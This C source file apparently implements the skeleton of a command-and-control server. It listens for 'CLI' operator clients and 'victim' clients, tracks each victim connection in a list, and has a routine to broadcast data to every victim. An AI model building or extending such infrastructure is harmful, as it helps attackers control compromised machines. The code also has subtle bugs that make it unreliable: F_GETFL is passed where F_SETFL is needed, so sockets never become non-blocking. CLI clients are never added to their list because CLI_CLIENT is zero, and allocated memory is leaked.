#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>         // for socket(), bind(), connect(), close()
#include <arpa/inet.h>          // for sockaddr_in and inet_ntoa()
#include <unistd.h>

#include "netwerking.h"

#define CLI_CLIENT 0
#define VICTIM_CLIENT 1
#define UNUSED(X) (void)(X);

/* === Tcp Initialization and Handle Functions === */

int initTcpServer(int port){
        
        int fd = socket(AF_INET, SOCK_STREAM, 0);
        if (fd < 0)
                perror("ERROR opening socket");
        
        int opt = 1;
        if (setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt)) < 0)
                perror("ERROR setsockopt");
        
        struct sockaddr_in serv_addr;
        memset(&serv_addr, 0, sizeof(serv_addr));
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_addr.s_addr = INADDR_ANY;
        serv_addr.sin_port = htons(port);

        if (netListen(fd, (struct sockaddr*)&serv_addr, sizeof(serv_addr)) == NET_ERR)
                fd = NET_ERR;

        return fd;
}

void handleCliAccept(struct eventLoop *event_loop, int fd, int mask, void *clientData){
        UNUSED(event_loop);
        UNUSED(mask);
        UNUSED(clientData);
        
        struct sockaddr_in address;  
        socklen_t address_len = sizeof(address);

        int clifd = netAccept(fd, (struct sockaddr*)&address, &address_len);
        netNonBlock(NULL, clifd); 
        printf("New CLI Client connected\n");

        struct connection *conn = connCreateConnection(clifd);

        struct client *cli = createClient(conn, CLI_CLIENT);
}

void handleVictimAccept(struct eventLoop *event_loop, int fd, int mask, void *clientData){
        UNUSED(event_loop);
        UNUSED(mask);
        UNUSED(clientData);

        struct sockaddr_in address;  
        socklen_t address_len = sizeof(address);

        int client_fd = netAccept(fd, (struct sockaddr*)&address, &address_len);
        netNonBlock(NULL, client_fd); 
        printf("New Victim connected\n");

        struct connection *conn = connCreateConnection(client_fd);
       

        struct client *victim = createClient(conn, VICTIM_CLIENT);
}

/* === Client Handler and Functions  ===  */
struct client *createClient(struct connection *conn, int mask){
        struct client *c = malloc(sizeof(struct client));
        if (c == NULL) return NULL;
        
        c->conn = malloc(sizeof(*(c->conn)));
        c->cmd = malloc(sizeof(*(c->cmd)));
        if (c->cmd == NULL || c->conn == NULL) return NULL;

        if (conn){
                connSetReadHandler(conn, readDataFromClient);
                //connSetHandlers(conn, readDataFromClient, sendDataToClient);
                connSetPrivData(conn, c);
                //connSetWriteHandler(conn, sendDataToClient);
        }

        c->conn = conn;
        c->fd = conn->fd;

        // Add the new client to the linked list
        if (conn && (mask & CLI_CLIENT))
                linkList(server.cli, c);
        if (conn && (mask & VICTIM_CLIENT))
                linkList(server.victims, c);

        return c;
}

void linkList(struct list *list, struct client *c){
        addNodeToList(list, c);
        c->client_list_node = listFirst(list);
}

/* === Linux sys/socket Functions === */
int netListen(int s, struct sockaddr *sa, socklen_t len){
        if (bind(s, sa, len) == -1){
                close(s);
                return NET_ERR;
        }

        if (listen(s, 64) == -1){
                close(s);
                return NET_ERR;
        }

        return NET_OK;
}

int netSetBlock(char *err, int fd, int non_block){
        int getFlags, setFlags;

        // 0 = Blocking : 1 = Nonblocking  
        getFlags = fcntl(fd, F_GETFL);
        if (getFlags == -1)
                perror("getFlags");
        
        if (non_block)
                getFlags |= O_NONBLOCK;

        setFlags = fcntl(fd, F_GETFL, getFlags);

        if (setFlags == -1){
                printf("%s", err);        
                perror("setFlags");
        }

        return 0;         
}

int netNonBlock(char *err, int fd){
        return netSetBlock(err, fd, 1);
}

int netBlock(char *err, int fd){
        return netSetBlock(err, fd, 0);
}

int netAccept(int s, struct sockaddr *sa, socklen_t *len){
        int client = accept(s, sa, len);
        
        if (client < 0)
                perror("accept");
        
        return client;
}

void readDataFromClient(struct connection *conn){
        struct client *c = connGetPrivData(conn);
        
        char buff[1024];
        memset(buff, 0, sizeof(buff));
        
        int bytes = connRead(conn, buff, 1024);
        printf("Received %d bytes: %s\n", bytes, buff);        

        //struct list *group = server.victims;
        //sendToGroup(buff, group);
}

void sendToGroup(char *buff, struct list *group){
        struct listNode *temp;

        temp = group->head;
        while (temp != NULL){
                struct connection *conn = temp->data; 
                connWrite(conn, buff, 1024);
                temp = temp->next;
        }  
}

void sendDataToClient(struct connection *conn){
        char *motd = "From Server: MOTD\n";
        
        if (connWrite(conn, motd, strlen(motd)) < 0)
                perror("write");
        
        printf("Sent data to clients\n");
}

int netClose(int fd){
        return close(fd);    
}
